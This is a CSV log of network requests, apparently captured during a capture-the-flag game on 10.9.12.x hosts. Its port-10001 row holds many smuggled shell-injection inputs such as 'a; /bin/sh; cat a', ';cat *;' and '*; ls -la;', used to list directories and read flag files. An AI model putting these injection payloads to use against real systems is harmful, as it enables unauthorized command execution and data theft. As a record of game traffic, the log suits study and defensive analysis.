interface/src_ip/src_eth/dst_port,last_req_time,time_btw_req,all_data
tun0/10.9.12.1/undefined/10004,2022-02-19 18:01:19.966331,0,1 aaaa bbbb--ca--cat 4252061052--ca-- cat 723153654--1 aaaa bbbb--ca--cat 4252061052--3717168201 gRUW3LXNMxMnQhUubGcF FLGVKzg0MZ1oGRbd--3717168201 RVX0AjnQqPRP60XLTD5S--3717168201 gRUW3LXNMxMnQhUubGcF-- cat 4252061052--cat 4252061052--1 aaaa bbbb--ca--1 aaaa bbbb--ca--cat 4252061052--1 aaaa bbbb--cat 4252061052--ca--1 aaaa bbbb--ca--cat 4252061052--1 aaaa bbbb--cat 4252061052--ca--1 aaaa bbbb--cat 4252061052--ca--5166 admin hello--ca--cat 4252061052--2346102312 VjRzKbGyTHelt4PkbmwP FLGdAzOl3D3c2S4B--ca-- cat 4252061052--abcde test --ca-- cat 4252061052--1 aaaa bbbb--cat 4252061052--ca--1177607091 B5Wlyujwu6hhnZTfN8I2 FLGNDh1eyTYuvlXN--1177607091 B2rVqEATM1CF45sd2bxe--1177607091 B5Wlyujwu6hhnZTfN8I2--1 aaaa bbbb--ca--cat 4252061052--1 aaaa bbbb--ca--cat 4252061052--1 aaaa bbbb--cat 4252061052--ca--2346102312 VjRzKbGyTHelt4PkbmwP--1 aaaa bbbb--ca--cat 2346102312--1 aaaa bbbb--cat 2346102312--ca--abcde test --ca-- cat 2346102312--ca-- cat 2346102312--1 aaaa bbbb--ca--cat 2346102312--1 aaaa bbbb--ca--cat 2346102312--5166 admin hello--ca--  cat 2346102312--1 aaaa bbbb--ca--cat 2346102312--1 aaaa bbbb--ca--cat 2346102312
tun0/10.9.12.3/undefined/10004,2022-02-19 18:01:22.993046,0,8675309 a a--ca--cat 576562290--8675309 a a--ca--cat 659823571--8675309 a a--ca--cat 3658894398--8675309 a a--ca--cat 2840812414--8675309 a a--ca--cat 2982319238--8675309 a a--ca--cat 1044204977--8675309 a a--8675309 a a--ca--cat 2416656818--8675309 a a--ca--cat 3814844491--8675309 a a--ca--cat 3396181640--8675309 a a--ca--cat 3710503826--8675309 a a--ca--cat 3517523998--8675309 a a--ca--cat 644622004--8675309 a a--ca--cat 2237202838--8675309 a a--ca--cat 4228564621--8675309 a a--ca--cat 238793229--8675309 a a--ca--8675309 a a--ca--cat 445815976--8675309 a a--ca--cat 1172779987--8675309 a a--ca--cat 975884767--8675309 a a--ca--cat 3822165990--8675309 a a--ca--cat 3408820897--8675309 a a--ca--cat 3801324907--8675309 a a--ca--cat 2651709303--8675309 a a--ca--cat 567626391--8675309 a a--ca--cat 2232896573--8675309 a a--ca--cat 1966940853--8675309 a a--ca--cat 2872540220--8675309 a a--ca--cat 1175983082--8675309 a a--ca--cat 337311377--8675309 a a--ca--cat 1270909779--8675309 a a--ca--cat 2633096024--8675309 a a--ca--cat 3425078132--8675309 a a--ca--cat 2020859504--8675309 a a--ca--cat 2384635080--8675309 a a--ca--cat 3127038769--8675309 a a--ca--cat 1106005571--8675309 a a--ca--cat 3827945997--8675309 a a--ca--cat 2513382068--8675309 a a--ca--cat 231793564--8675309 a a--ca--8675309 a a--ca--cat 1813982388--8675309 a a--ca--cat 4223925810--8675309 a a--ca--cat 1780138887--8675309 a a--ca--cat 4112783359--8675309 a a--ca--cat 1272205751--8675309 a a--ca--cat 2209893647--8675309 a a--ca--cat 795873892--8675309 a a--ca--cat 567626391--8675309 a a--ca--cat 2232896573--8675309 a a--ca--cat 1966940853--8675309 a a--ca--cat 2872540220--8675309 a a--ca--cat 1175983082--8675309 a a--ca--cat 337311377--8675309 a a--ca--cat 1270909779--8675309 a a--ca--cat 2633096024--8675309 a a--ca--cat 3425078132--8675309 a a--ca--cat 2020859504--8675309 a a
tun0/10.9.12.1/undefined/10001,2022-02-19 18:01:22.994141,0,"2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 5b6i7s0q5n7r2f2h5r4r*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --5b6i7s0q5n7r2f2h5r4r--3l8h7d9w0x6a8m6x1r8s--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 5b6i7s0q5n7r2f2h5r4r*--5b6i7s0q5n7r2f2h5r4r--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --test; cat 5b6i7s0q5n7r2f2h5r4r*; echo--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 5b6i7s0q5n7r2f2h5r4r*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 5b6i7s0q5n7r2f2h5r4r*;  3--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --cat 5b6i7s0q5n7r2f2h5r4r*--a; /bin/sh; cat a--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0w6y6b3r7v7m4v3a9j3d--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 5b6i7s0q5n7r2f2h5r4r*--2i0q4c0g8d0h7u7q5r0i--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --5b6i7s0q5n7r2f2h5r4r--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --cat 5b6i7s0q5n7r2f2h5r4r*--a; /bin/sh; cat a--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --5b6i7s0q5n7r2f2h5r4r*;--5b6i7s0q5n7r2f2h5r4r*;--a;echo ""==="";cat *5b6i7s0q5n7r2f2h5r4r*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --5h4c5g1c3c5i9p6c1d8c--0s8k4y1a3f1u3b4h0q5r--S4wdHDklI2--test; cat 5b6i7s0q5n7r2f2h5r4r*; echo--2 a;ls | grep 5b6i7s0q5n7r2f2h5r4r;  --; cat 5b6i7s0q5n7r2f2h5r4r_*;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --cat 5b6i7s0q5n7r2f2h5r4r*--a; /bin/sh; cat a--cat 5b6i7s0q5n7r2f2h5r4r*--a; /bin/sh; cat a--a; /bin/sh; cat a--cat 5b6i7s0q5n7r2f2h5r4r*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0s8k4y1a3f1u3b4h0q5r--5h4c5g1c3c5i9p6c1d8c--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0s8k4y1a3f1u3b4h0q5r--*; ls -la;--2 a;ls | grep 0s8k4y1a3f1u3b4h0q5r;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 0s8k4y1a3f1u3b4h0q5r*;  3--cat 0s8k4y1a3f1u3b4h0q5r*--a; /bin/sh; cat a--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 some;cat 0s8k4y1a3f1u3b4h0q5r*;echo;  3 --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --cat 0s8k4y1a3f1u3b4h0q5r*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --;cat *;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --7y0p5q2t3s3t3t3p6m7f--FLGPF8DOsEXF9YGD--FLGXc3xUz7VXHAh--7z1b5e5s7--7y0p5q2t3s3t3t3p6m7f--FLGPF8DOsEXF9YGD--7y0p5q2t3s3t3t3p6m7f--FLG5WjkCwiwrUZc5--6y6f8v3y7f9c7u4e3c0r3x9u8v8l7t4x3c4r0a1nFLG1hwjxpO7pkWLP9m2g2k7e1b9v9t3c4m4f4o6d8z3s8--test; cat 0s8k4y1a3f1u3b4h0q5r*; echo--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0w6y6b3r7v7m4v3a9j3d--*; ls -la;--;cat *;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --cat 0s8k4y1a3f1u3b4h0q5r*--a; /bin/sh; cat a--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 0s8k4y1a3f1u3b4h0q5r*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2i0q4c0g8d0h7u7q5r0i--*; ls -la;--0s8k4y1a3f1u3b4h0q5r--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 0s8k4y1a3f1u3b4h0q5r*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 0s8k4y1a3f1u3b4h0q5r*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a;echo ""==="";cat *0s8k4y1a3f1u3b4h0q5r*;echo ""==="";--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --test; cat 0s8k4y1a3f1u3b4h0q5r*; echo--2 0s8k4y1a3f1u3b4h0q5r*;  3--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --a; /bin/sh; cat a--cat 0s8k4y1a3f1u3b4h0q5r*--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --cat 0s8k4y1a3f1u3b4h0q5r*--a; /bin/sh; cat a--0s8k4y1a3f1u3b4h0q5r--*; ls -la;--2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --2 a;ls | grep 0s8k4y1a3f1u3b4h0q5r;  --2 a;ls | grep 7e0y1m3r5b5t4x4o3b0x;  --0s8k4y1a3f1u3b4h0q5r*;--0s8k4y1a3f1u3b4h0q5r*;--5d3p2p2i3g0r5u9j1r2w--6x7l0e6o0g0g6a7j1n9o--NhMuaNCE5P"
tun0/10.9.12.3/undefined/10001,2022-02-19 18:02:34.723715,0,8b5n0e9h8v7s6l1c1c2r--2i4c0c7v9y8q9b4b9z8e--2t0p2q5e5h2i3p3u6b7n--7l2z1w9m7n7j9p3k0t9c--5g7f1y1i6o1v9d8m0e2i--6t8q1w3s6p6r4q8n9p5q--3c2k4p0f4l8p1y1i8k8w--4m9h7h0l5z3q7z7r5c2v--4d1f8v0z0q5q0g6i6t8d--0s6r8w9y0j2e5j7m8y1r--0u7o5z9m3k6x8t7u1z2e--8m6r8q7p3z7e4s1h7n6g--8v0d8t7m2h2b5t1j0m0e--3r3d3g0x7y8a2y7q4t8x--2d7c4z4u9u2f4t1i1y8b--1r2e9v5k8h6t6i5a9y0q
